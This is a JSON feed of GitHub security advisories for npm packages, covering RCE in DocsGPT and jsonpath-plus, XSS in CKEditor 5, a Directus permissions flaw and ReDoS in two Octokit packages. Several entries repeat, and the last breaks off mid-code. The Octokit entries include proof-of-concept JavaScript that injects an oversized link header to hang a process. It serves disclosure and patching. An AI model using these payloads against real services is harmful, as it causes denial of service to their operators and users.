{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for JavaScript packages hosted at npmjs.com",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/npm.json",
    "description": "Security Advisory for JavaScript packages hosted at npmjs.com on GitHub",
    "items": [
        {
            "content_html": "<p>A vulnerability, that could result in Remote Code Execution (RCE), has been found in DocsGPT. Due to improper parsing of JSON data using eval() an unauthorized attacker could send arbitrary Python code to be executed via /api/remote endpoint.</p>\n<p>This issue affects DocsGPT: from 0.8.1 through 0.12.0.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-0868\">https://nvd.nist.gov/vuln/detail/CVE-2025-0868</a></li>\n<li><a href=\"https://cert.pl/en/posts/2025/02/CVE-2025-0868\">https://cert.pl/en/posts/2025/02/CVE-2025-0868</a></li>\n<li><a href=\"https://cert.pl/posts/2025/02/CVE-2025-0868\">https://cert.pl/posts/2025/02/CVE-2025-0868</a></li>\n<li><a href=\"https://github.com/arc53/DocsGPT\">https://github.com/arc53/DocsGPT</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9gff-5v8w-x922\">https://github.com/advisories/GHSA-9gff-5v8w-x922</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9gff-5v8w-x922",
            "title": "[docsgpt] DocsGPT Allows Remote Code Execution",
            "date_modified": "2025-02-20T20:18:37.000Z",
            "date_published": "2025-02-20T12:31:15.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9gff-5v8w-x922"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>During a recent internal audit, we identified a Cross-Site Scripting (XSS) vulnerability in the CKEditor 5 real-time collaboration package. This vulnerability can lead to unauthorized JavaScript code execution and affects user markers, which represent users' positions within the document.</p>\n<p>This vulnerability affects only installations with <a href=\"https://ckeditor.com/docs/ckeditor5/latest/features/collaboration/real-time-collaboration/real-time-collaboration.html\">Real-time collaborative editing</a> enabled.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The problem has been recognized and patched. The fix will be available in version 44.2.1 (and above).</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Email us at <a href=\"mailto:security@cksource.com\">security@cksource.com</a> if you have any questions or comments about this advisory.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ckeditor/ckeditor5/security/advisories/GHSA-j3mm-wmfm-mwvh\">https://github.com/ckeditor/ckeditor5/security/advisories/GHSA-j3mm-wmfm-mwvh</a></li>\n<li><a href=\"https://ckeditor.com/docs/ckeditor5/latest/features/collaboration/real-time-collaboration/real-time-collaboration.html?docId=ee1dca024c9b4e44aef039f99ebe6c664\">https://ckeditor.com/docs/ckeditor5/latest/features/collaboration/real-time-collaboration/real-time-collaboration.html?docId=ee1dca024c9b4e44aef039f99ebe6c664</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-j3mm-wmfm-mwvh\">https://github.com/advisories/GHSA-j3mm-wmfm-mwvh</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-j3mm-wmfm-mwvh",
            "title": "[ckeditor5-premium-features] Cross-site scripting (XSS) in the CKEditor 5 real-time collaboration package",
            "date_modified": "2025-02-20T20:16:38.000Z",
            "date_published": "2025-02-20T20:16:31.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-j3mm-wmfm-mwvh"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>During a recent internal audit, we identified a Cross-Site Scripting (XSS) vulnerability in the CKEditor 5 real-time collaboration package. This vulnerability can lead to unauthorized JavaScript code execution and affects user markers, which represent users' positions within the document.</p>\n<p>This vulnerability affects only installations with <a href=\"https://ckeditor.com/docs/ckeditor5/latest/features/collaboration/real-time-collaboration/real-time-collaboration.html\">Real-time collaborative editing</a> enabled.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The problem has been recognized and patched. The fix will be available in version 44.2.1 (and above).</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Email us at <a href=\"mailto:security@cksource.com\">security@cksource.com</a> if you have any questions or comments about this advisory.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ckeditor/ckeditor5/security/advisories/GHSA-j3mm-wmfm-mwvh\">https://github.com/ckeditor/ckeditor5/security/advisories/GHSA-j3mm-wmfm-mwvh</a></li>\n<li><a href=\"https://ckeditor.com/docs/ckeditor5/latest/features/collaboration/real-time-collaboration/real-time-collaboration.html?docId=ee1dca024c9b4e44aef039f99ebe6c664\">https://ckeditor.com/docs/ckeditor5/latest/features/collaboration/real-time-collaboration/real-time-collaboration.html?docId=ee1dca024c9b4e44aef039f99ebe6c664</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-j3mm-wmfm-mwvh\">https://github.com/advisories/GHSA-j3mm-wmfm-mwvh</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-j3mm-wmfm-mwvh",
            "title": "[@ckeditor/ckeditor5-real-time-collaboration] Cross-site scripting (XSS) in the CKEditor 5 real-time collaboration package",
            "date_modified": "2025-02-20T20:16:38.000Z",
            "date_published": "2025-02-20T20:16:31.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-j3mm-wmfm-mwvh"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>If there are two overlapping policies for the <code>update</code> action that allow access to different fields, instead of correctly checking access permissions against the item they apply for the user is allowed to update the superset of fields allowed by any of the policies. </p>\n<p>E.g. have one policy allowing update access to <code>field_a</code> if the <code>id == 1</code> and one policy allowing update access to <code>field_b</code> if the <code>id == 2</code>. The user with both these policies is allowed to update both <code>field_a</code> and <code>field_b</code> for the items with ids <code>1</code> and <code>2</code>. </p>\n<h3 id=\"details\">Details</h3>\n<p>Before v11, if a user was allowed to update an item they were allowed to update the fields that the single permission, that applied to that item, listed. With overlapping permissions this isn't as clear cut anymore and the union of fields might not be the fields the user is allowed to update for that specific item.</p>\n<p>The solution that this PR introduces is to evaluate the permissions for each field that the user tries to update in the validateItemAccess DB query, instead of only verifying access to the item as a whole. This is done by, instead of returning the actual field value, returning a flag that indicates if the user has access to that field. This uses the same case/when mechanism that is used for stripping out non permitted field that is at the core of the permissions engine.</p>\n<p>As a result, for every item that the access is validated for, the expected result is an item that has either 1 or null for all the \"requested\" fields instead of any of the actual field values. These results are not useful for anything other than verifying the field level access permissions.</p>\n<p>The final check in validateItemAccess can either fail if the number of items does not match the number of items the access is checked for (ie. the user does not have access to the item at all) or if not all of the passed in fields have access permissions for any of the returned items.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>This is a vulnerability that allows update access to unintended fields, potentially impacting the password field for user accounts.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/directus/directus/security/advisories/GHSA-99vm-5v2h-h6r6\">https://github.com/directus/directus/security/advisories/GHSA-99vm-5v2h-h6r6</a></li>\n<li><a href=\"https://github.com/directus/directus/commit/a7ea67783b060d0d6fc964d71c2d4575d5eee4e2\">https://github.com/directus/directus/commit/a7ea67783b060d0d6fc964d71c2d4575d5eee4e2</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27089\">https://nvd.nist.gov/vuln/detail/CVE-2025-27089</a></li>\n<li><a href=\"https://github.com/directus/directus/releases/tag/v11.1.2\">https://github.com/directus/directus/releases/tag/v11.1.2</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-99vm-5v2h-h6r6\">https://github.com/advisories/GHSA-99vm-5v2h-h6r6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-99vm-5v2h-h6r6",
            "title": "[@directus/api] Directus allows updates to non-allowed fields due to overlapping policies",
            "date_modified": "2025-02-19T19:59:57.000Z",
            "date_published": "2025-02-19T17:46:27.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-99vm-5v2h-h6r6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>If there are two overlapping policies for the <code>update</code> action that allow access to different fields, instead of correctly checking access permissions against the item they apply for the user is allowed to update the superset of fields allowed by any of the policies. </p>\n<p>E.g. have one policy allowing update access to <code>field_a</code> if the <code>id == 1</code> and one policy allowing update access to <code>field_b</code> if the <code>id == 2</code>. The user with both these policies is allowed to update both <code>field_a</code> and <code>field_b</code> for the items with ids <code>1</code> and <code>2</code>. </p>\n<h3 id=\"details\">Details</h3>\n<p>Before v11, if a user was allowed to update an item they were allowed to update the fields that the single permission, that applied to that item, listed. With overlapping permissions this isn't as clear cut anymore and the union of fields might not be the fields the user is allowed to update for that specific item.</p>\n<p>The solution that this PR introduces is to evaluate the permissions for each field that the user tries to update in the validateItemAccess DB query, instead of only verifying access to the item as a whole. This is done by, instead of returning the actual field value, returning a flag that indicates if the user has access to that field. This uses the same case/when mechanism that is used for stripping out non permitted field that is at the core of the permissions engine.</p>\n<p>As a result, for every item that the access is validated for, the expected result is an item that has either 1 or null for all the \"requested\" fields instead of any of the actual field values. These results are not useful for anything other than verifying the field level access permissions.</p>\n<p>The final check in validateItemAccess can either fail if the number of items does not match the number of items the access is checked for (ie. the user does not have access to the item at all) or if not all of the passed in fields have access permissions for any of the returned items.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>This is a vulnerability that allows update access to unintended fields, potentially impacting the password field for user accounts.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/directus/directus/security/advisories/GHSA-99vm-5v2h-h6r6\">https://github.com/directus/directus/security/advisories/GHSA-99vm-5v2h-h6r6</a></li>\n<li><a href=\"https://github.com/directus/directus/commit/a7ea67783b060d0d6fc964d71c2d4575d5eee4e2\">https://github.com/directus/directus/commit/a7ea67783b060d0d6fc964d71c2d4575d5eee4e2</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27089\">https://nvd.nist.gov/vuln/detail/CVE-2025-27089</a></li>\n<li><a href=\"https://github.com/directus/directus/releases/tag/v11.1.2\">https://github.com/directus/directus/releases/tag/v11.1.2</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-99vm-5v2h-h6r6\">https://github.com/advisories/GHSA-99vm-5v2h-h6r6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-99vm-5v2h-h6r6",
            "title": "[directus] Directus allows updates to non-allowed fields due to overlapping policies",
            "date_modified": "2025-02-19T19:59:57.000Z",
            "date_published": "2025-02-19T17:46:27.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-99vm-5v2h-h6r6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Versions of the package jsonpath-plus before 10.3.0 are vulnerable to Remote Code Execution (RCE) due to improper input sanitization. An attacker can execute aribitrary code on the system by exploiting the unsafe default usage of eval='safe' mode.</p>\n<p><strong>Note:</strong></p>\n<p>This is caused by an incomplete fix for CVE-2024-21534.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-1302\">https://nvd.nist.gov/vuln/detail/CVE-2025-1302</a></li>\n<li><a href=\"https://github.com/JSONPath-Plus/JSONPath/commit/30942896d27cb8a806b965a5ca9ef9f686be24ee\">https://github.com/JSONPath-Plus/JSONPath/commit/30942896d27cb8a806b965a5ca9ef9f686be24ee</a></li>\n<li><a href=\"https://gist.github.com/nickcopi/11ba3cb4fdee6f89e02e6afae8db6456\">https://gist.github.com/nickcopi/11ba3cb4fdee6f89e02e6afae8db6456</a></li>\n<li><a href=\"https://security.snyk.io/vuln/SNYK-JS-JSONPATHPLUS-8719585\">https://security.snyk.io/vuln/SNYK-JS-JSONPATHPLUS-8719585</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-21534\">https://nvd.nist.gov/vuln/detail/CVE-2024-21534</a></li>\n<li><a href=\"https://github.com/JSONPath-Plus/JSONPath/blob/8e4acf8aff5f446aa66323e12394ac5615c3b260/src/Safe-Script.js#L127\">https://github.com/JSONPath-Plus/JSONPath/blob/8e4acf8aff5f446aa66323e12394ac5615c3b260/src/Safe-Script.js#L127</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hw8r-x6gr-5gjp\">https://github.com/advisories/GHSA-hw8r-x6gr-5gjp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hw8r-x6gr-5gjp",
            "title": "[jsonpath-plus] JSONPath Plus allows Remote Code Execution",
            "date_modified": "2025-02-18T19:25:35.000Z",
            "date_published": "2025-02-15T06:30:51.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hw8r-x6gr-5gjp"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The regular expression <code>/&lt;([^&gt;]+)&gt;; rel=\"deprecation\"/</code> used to match the <code>link</code> header in HTTP responses is vulnerable to a ReDoS (Regular Expression Denial of Service) attack. This vulnerability arises due to the unbounded nature of the regex's matching behavior, which can lead to catastrophic backtracking when processing specially crafted input. An attacker could exploit this flaw by sending a malicious <code>link</code> header, resulting in excessive CPU usage and potentially causing the server to become unresponsive, impacting service availability.</p>\n<h3 id=\"details\">Details</h3>\n<p>The vulnerability resides in the regular expression <code>/&lt;([^&gt;]+)&gt;; rel=\"deprecation\"/</code>, which is used to match the <code>link</code> header in HTTP responses. This regular expression captures content between angle brackets (<code>&lt;&gt;</code>) followed by <code>; rel=\"deprecation\"</code>. However, the pattern is vulnerable to ReDoS (Regular Expression Denial of Service) attacks due to its susceptibility to catastrophic backtracking when processing malicious input.\nAn attacker can exploit this vulnerability by sending a specially crafted <code>link</code> header designed to trigger excessive backtracking. For example, the following headers:</p>\n<pre><code class=\"language-js\">fakeHeaders.set(\"link\", \"&lt;\".repeat(100000) + \"&gt;\");\nfakeHeaders.set(\"deprecation\", \"true\");\n</code></pre>\n<p>The crafted <code>link</code> header consists of 100,000 consecutive <code>&lt;</code> characters followed by a closing <code>&gt;</code>. This input forces the regular expression engine to backtrack extensively in an attempt to match the pattern. As a result, the server can experience a significant increase in CPU usage, which may lead to denial of service, making the server unresponsive or even causing it to crash under load.\nThe issue is present in the following code:</p>\n<pre><code class=\"language-js\">const matches = responseHeaders.link &amp;&amp; responseHeaders.link.match(/&lt;([^&gt;]+)&gt;; rel=\"deprecation\"/);\n</code></pre>\n<p>In this scenario, the <code>link</code> header value triggers the regex to perform excessive backtracking, resulting in resource exhaustion and potentially causing the service to become unavailable.</p>\n<h3 id=\"poc\">PoC</h3>\n<p><a href=\"https://gist.github.com/ShiyuBanzhou/2afdabf0fc4cb6cfbd3b1d58b6082f6a\">The gist of PoC.js</a></p>\n<ol>\n<li>run npm i @octokit/request</li>\n<li>run 'node poc.js'\nresult:</li>\n<li>then the program will stuck forever with high CPU usage</li>\n</ol>\n<pre><code class=\"language-js\">import { request } from \"@octokit/request\";\nconst originalFetch = globalThis.fetch;\nglobalThis.fetch = async (url, options) =&gt; {\n  const response = await originalFetch(url, options);\n  const fakeHeaders = new Headers(response.headers);\n  fakeHeaders.set(\"link\", \"&lt;\".repeat(100000) + \"&gt;\");\n  fakeHeaders.set(\"deprecation\", \"true\");\n  return new Response(response.body, {\n    status: response.status,\n    statusText: response.statusText,\n    headers: fakeHeaders\n  });\n};\nrequest(\"GET /repos/octocat/hello-world\")\n  .then(response =&gt; {\n    // console.log(\"[+] Response received:\", response);\n  })\n  .catch(error =&gt; {\n    // console.error(\"[-] Error:\", error);\n  });\n// globalThis.fetch = originalFetch;\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>This is a <em>Denial of Service (DoS) vulnerability</em> caused by a <em>ReDoS (Regular Expression Denial of Service)</em> flaw. The vulnerability allows an attacker to craft a malicious <code>link</code> header that exploits the inefficient backtracking behavior of the regular expression used in the code.\nThe primary impact is the potential for <em>server resource exhaustion</em>, specifically high CPU usage, which can cause the server to become unresponsive or even crash when processing the malicious request. This affects the availability of the service, leading to downtime or degraded performance.\nThe vulnerability impacts any system that uses this specific regular expression to process <code>link</code> headers in HTTP responses. This can include:</p>\n<ul>\n<li>Web applications or APIs that rely on parsing headers for deprecation information.</li>\n<li>Users interacting with the affected service, as they may experience delays or outages if the server becomes overwhelmed.</li>\n<li>Service providers who may face disruption in operations or performance degradation due to this flaw.\nIf left unpatched, the vulnerability can be exploited by any unauthenticated user who is able to send a specially crafted HTTP request with a malicious <code>link</code> header, making it a low-barrier attack that could be exploited by anyone.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/octokit/request.js/security/advisories/GHSA-rmvr-2pp2-xj38\">https://github.com/octokit/request.js/security/advisories/GHSA-rmvr-2pp2-xj38</a></li>\n<li><a href=\"https://github.com/octokit/request.js/commit/34ff07ee86fc5c20865982d77391bc910ef19c68\">https://github.com/octokit/request.js/commit/34ff07ee86fc5c20865982d77391bc910ef19c68</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-25290\">https://nvd.nist.gov/vuln/detail/CVE-2025-25290</a></li>\n<li><a href=\"https://github.com/octokit/request.js/releases/tag/v8.4.1\">https://github.com/octokit/request.js/releases/tag/v8.4.1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rmvr-2pp2-xj38\">https://github.com/advisories/GHSA-rmvr-2pp2-xj38</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rmvr-2pp2-xj38",
            "title": "[@octokit/request] @octokit/request has a Regular Expression in fetchWrapper that Leads to ReDoS Vulnerability Due to Catastrophic Backtracking",
            "date_modified": "2025-02-18T19:17:42.000Z",
            "date_published": "2025-02-14T18:00:18.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rmvr-2pp2-xj38"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The regular expression <code>/&lt;([^&gt;]+)&gt;; rel=\"deprecation\"/</code> used to match the <code>link</code> header in HTTP responses is vulnerable to a ReDoS (Regular Expression Denial of Service) attack. This vulnerability arises due to the unbounded nature of the regex's matching behavior, which can lead to catastrophic backtracking when processing specially crafted input. An attacker could exploit this flaw by sending a malicious <code>link</code> header, resulting in excessive CPU usage and potentially causing the server to become unresponsive, impacting service availability.</p>\n<h3 id=\"details\">Details</h3>\n<p>The vulnerability resides in the regular expression <code>/&lt;([^&gt;]+)&gt;; rel=\"deprecation\"/</code>, which is used to match the <code>link</code> header in HTTP responses. This regular expression captures content between angle brackets (<code>&lt;&gt;</code>) followed by <code>; rel=\"deprecation\"</code>. However, the pattern is vulnerable to ReDoS (Regular Expression Denial of Service) attacks due to its susceptibility to catastrophic backtracking when processing malicious input.\nAn attacker can exploit this vulnerability by sending a specially crafted <code>link</code> header designed to trigger excessive backtracking. For example, the following headers:</p>\n<pre><code class=\"language-js\">fakeHeaders.set(\"link\", \"&lt;\".repeat(100000) + \"&gt;\");\nfakeHeaders.set(\"deprecation\", \"true\");\n</code></pre>\n<p>The crafted <code>link</code> header consists of 100,000 consecutive <code>&lt;</code> characters followed by a closing <code>&gt;</code>. This input forces the regular expression engine to backtrack extensively in an attempt to match the pattern. As a result, the server can experience a significant increase in CPU usage, which may lead to denial of service, making the server unresponsive or even causing it to crash under load.\nThe issue is present in the following code:</p>\n<pre><code class=\"language-js\">const matches = responseHeaders.link &amp;&amp; responseHeaders.link.match(/&lt;([^&gt;]+)&gt;; rel=\"deprecation\"/);\n</code></pre>\n<p>In this scenario, the <code>link</code> header value triggers the regex to perform excessive backtracking, resulting in resource exhaustion and potentially causing the service to become unavailable.</p>\n<h3 id=\"poc\">PoC</h3>\n<p><a href=\"https://gist.github.com/ShiyuBanzhou/2afdabf0fc4cb6cfbd3b1d58b6082f6a\">The gist of PoC.js</a></p>\n<ol>\n<li>run npm i @octokit/request</li>\n<li>run 'node poc.js'\nresult:</li>\n<li>then the program will stuck forever with high CPU usage</li>\n</ol>\n<pre><code class=\"language-js\">import { request } from \"@octokit/request\";\nconst originalFetch = globalThis.fetch;\nglobalThis.fetch = async (url, options) =&gt; {\n  const response = await originalFetch(url, options);\n  const fakeHeaders = new Headers(response.headers);\n  fakeHeaders.set(\"link\", \"&lt;\".repeat(100000) + \"&gt;\");\n  fakeHeaders.set(\"deprecation\", \"true\");\n  return new Response(response.body, {\n    status: response.status,\n    statusText: response.statusText,\n    headers: fakeHeaders\n  });\n};\nrequest(\"GET /repos/octocat/hello-world\")\n  .then(response =&gt; {\n    // console.log(\"[+] Response received:\", response);\n  })\n  .catch(error =&gt; {\n    // console.error(\"[-] Error:\", error);\n  });\n// globalThis.fetch = originalFetch;\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>This is a <em>Denial of Service (DoS) vulnerability</em> caused by a <em>ReDoS (Regular Expression Denial of Service)</em> flaw. The vulnerability allows an attacker to craft a malicious <code>link</code> header that exploits the inefficient backtracking behavior of the regular expression used in the code.\nThe primary impact is the potential for <em>server resource exhaustion</em>, specifically high CPU usage, which can cause the server to become unresponsive or even crash when processing the malicious request. This affects the availability of the service, leading to downtime or degraded performance.\nThe vulnerability impacts any system that uses this specific regular expression to process <code>link</code> headers in HTTP responses. This can include:</p>\n<ul>\n<li>Web applications or APIs that rely on parsing headers for deprecation information.</li>\n<li>Users interacting with the affected service, as they may experience delays or outages if the server becomes overwhelmed.</li>\n<li>Service providers who may face disruption in operations or performance degradation due to this flaw.\nIf left unpatched, the vulnerability can be exploited by any unauthenticated user who is able to send a specially crafted HTTP request with a malicious <code>link</code> header, making it a low-barrier attack that could be exploited by anyone.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/octokit/request.js/security/advisories/GHSA-rmvr-2pp2-xj38\">https://github.com/octokit/request.js/security/advisories/GHSA-rmvr-2pp2-xj38</a></li>\n<li><a href=\"https://github.com/octokit/request.js/commit/34ff07ee86fc5c20865982d77391bc910ef19c68\">https://github.com/octokit/request.js/commit/34ff07ee86fc5c20865982d77391bc910ef19c68</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-25290\">https://nvd.nist.gov/vuln/detail/CVE-2025-25290</a></li>\n<li><a href=\"https://github.com/octokit/request.js/releases/tag/v8.4.1\">https://github.com/octokit/request.js/releases/tag/v8.4.1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rmvr-2pp2-xj38\">https://github.com/advisories/GHSA-rmvr-2pp2-xj38</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rmvr-2pp2-xj38",
            "title": "[@octokit/request] @octokit/request has a Regular Expression in fetchWrapper that Leads to ReDoS Vulnerability Due to Catastrophic Backtracking",
            "date_modified": "2025-02-18T19:17:42.000Z",
            "date_published": "2025-02-14T18:00:18.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rmvr-2pp2-xj38"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>For the npm package <code>@octokit/plugin-paginate-rest</code>, when calling <code>octokit.paginate.iterator()</code>, a specially crafted <code>octokit</code> instance—particularly with a malicious <code>link</code> parameter in the <code>headers</code> section of the <code>request</code>—can trigger a ReDoS attack.</p>\n<h3 id=\"details\">Details</h3>\n<p>The issue occurs at <a href=\"https://github.com/octokit/plugin-paginate-rest.js/blob/main/src/iterator.ts\">line 39</a> of iterator.ts in the @octokit/plugin-paginate-rest repository. The relevant code is as follows:</p>\n<pre><code class=\"language-js\">url = ((normalizedResponse.headers.link || \"\").match(\n  /&lt;([^&gt;]+)&gt;;\\s*rel=\"next\"/,\n) || [])[1];\n</code></pre>\n<p>The regular expression <code>/&lt;([^&gt;]+)&gt;;\\s*rel=\"next\"/</code> may lead to a potential backtracking vulnerability, resulting in a ReDoS (Regular Expression Denial of Service) attack. This could cause high CPU utilization and even service slowdowns or freezes when processing specially crafted <code>Link</code> headers.</p>\n<h3 id=\"poc\">PoC</h3>\n<p><a href=\"https://gist.github.com/ShiyuBanzhou/d3f2ad000be8384d2105c87c2ed7ce7d\">The gist of PoC.js</a></p>\n<ol>\n<li>run npm i @octokit/plugin-paginate-rest</li>\n<li>run 'node poc.js'\nresult:</li>\n<li>then the program will stuck forever with high CPU usage</li>\n</ol>\n<pre><code class=\"language-js\">import { Octokit } from \"@octokit/core\";\nimport { paginateRest } from \"@octokit/plugin-paginate-rest\";\n\nconst MyOctokit = Octokit.plugin(paginateRest);\nconst octokit = new MyOctokit({\n  auth: \"your-github-token\",\n});\n\n// Intercept the request to inject a malicious 'link' header for ReDoS\noctokit.hook.wrap(\"request\", async (request, options) =&gt; {\n  const maliciousLinkHeader = \"\" + \"&lt;\".repeat(100000) + \"&gt;\"; // attack string\n  return {\n    data: [],\n    headers: {\n      link: maliciousLinkHeader, // Inject malicious 'link' header\n    },\n  };\n});\n\n// Trigger the ReDoS attack by paginating through GitHub issues\n(async () =&gt; {\n  try {\n    for await (const normalizedResponse of octokit.paginate.iterator(\n      \"GET /repos/{owner}/{repo}/issues\", { owner: \"DayShift\", repo: \"ReDos\", per_page: 100 }\n    )) {\n      console.log({ normalizedResponse });\n    }\n  } catch (error) {\n    console.error(\"Error encountered:\", error);\n  }\n})();\n</code></pre>\n<p><img alt=\"image\" src=\"https://github.com/user-attachments/assets/619c030e-5473-4a26-9e2a-4b9a26c1563b\"></p>\n<h3 id=\"impact\">Impact</h3>\n<h4 id=\"what-kind-of-vulnerability-is-it\">What kind of vulnerability is it?</h4>\n<p>This is a <em>Regular Expression Denial of Service (ReDoS) vulnerability</em>, which occurs due to excessive backtracking in the regex pattern:</p>\n<pre><code class=\"language-js\">/&lt;([^&gt;]+)&gt;;\\s*rel=\"next\"/\n</code></pre>\n<p>When processing a specially crafted <code>Link</code> header, this regex can cause significant performance degradation, leading to high CPU utilization and potential service unresponsiveness.</p>\n<h4 id=\"who-is-impacted\">Who is impacted?</h4>\n<ul>\n<li>Users of <code>@octokit/plugin-paginate-rest</code> who call <code>octokit.paginate.iterator()</code> and process untrusted or manipulated <code>Link</code> headers.</li>\n<li>Applications relying on Octokit's pagination mechanism, particularly those handling large volumes of API requests.</li>\n<li>GitHub API consumers who integrate this package into their projects for paginated data retrieval.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/octokit/plugin-paginate-rest.js/security/advisories/GHSA-h5c3-5r3r-rr8q\">https://github.com/octokit/plugin-paginate-rest.js/security/advisories/GHSA-h5c3-5r3r-rr8q</a></li>\n<li><a href=\"https://github.com/octokit/plugin-paginate-rest.js/commit/bb6c4f945d8023902cf387391d2b2209261044ab\">https://github.com/octokit/plugin-paginate-rest.js/commit/bb6c4f945d8023902cf387391d2b2209261044ab</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-25288\">https://nvd.nist.gov/vuln/detail/CVE-2025-25288</a></li>\n<li><a href=\"https://github.com/octokit/plugin-paginate-rest.js/blob/main/src/iterator.ts\">https://github.com/octokit/plugin-paginate-rest.js/blob/main/src/iterator.ts</a></li>\n<li><a href=\"https://github.com/octokit/plugin-paginate-rest.js/releases/tag/v9.2.2\">https://github.com/octokit/plugin-paginate-rest.js/releases/tag/v9.2.2</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-h5c3-5r3r-rr8q\">https://github.com/advisories/GHSA-h5c3-5r3r-rr8q</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-h5c3-5r3r-rr8q",
            "title": "[@octokit/plugin-paginate-rest] @octokit/plugin-paginate-rest has a Regular Expression in iterator Leads to ReDoS Vulnerability Due to Catastrophic Backtracking",
            "date_modified": "2025-02-18T19:15:06.000Z",
            "date_published": "2025-02-14T17:57:59.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-h5c3-5r3r-rr8q"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>For the npm package <code>@octokit/plugin-paginate-rest</code>, when calling <code>octokit.paginate.iterator()</code>, a specially crafted <code>octokit</code> instance—particularly with a malicious <code>link</code> parameter in the <code>headers</code> section of the <code>request</code>—can trigger a ReDoS attack.</p>\n<h3 id=\"details\">Details</h3>\n<p>The issue occurs at <a href=\"https://github.com/octokit/plugin-paginate-rest.js/blob/main/src/iterator.ts\">line 39</a> of iterator.ts in the @octokit/plugin-paginate-rest repository. The relevant code is as follows:</p>\n<pre><code class=\"language-js\">url = ((normalizedResponse.headers.link || \"\").match(\n  /&lt;([^&gt;]+)&gt;;\\s*rel=\"next\"/,\n) || [])[1];\n</code></pre>\n<p>The regular expression <code>/&lt;([^&gt;]+)&gt;;\\s*rel=\"next\"/</code> may lead to a potential backtracking vulnerability, resulting in a ReDoS (Regular Expression Denial of Service) attack. This could cause high CPU utilization and even service slowdowns or freezes when processing specially crafted <code>Link</code> headers.</p>\n<h3 id=\"poc\">PoC</h3>\n<p><a href=\"https://gist.github.com/ShiyuBanzhou/d3f2ad000be8384d2105c87c2ed7ce7d\">The gist of PoC.js</a></p>\n<ol>\n<li>run npm i @octokit/plugin-paginate-rest</li>\n<li>run 'node poc.js'\nresult:</li>\n<li>then the program will stuck forever with high CPU usage</li>\n</ol>\n<pre><code class=\"language-js\">import { Octokit } from \"@octokit/core\";\nimport { paginateRest } from 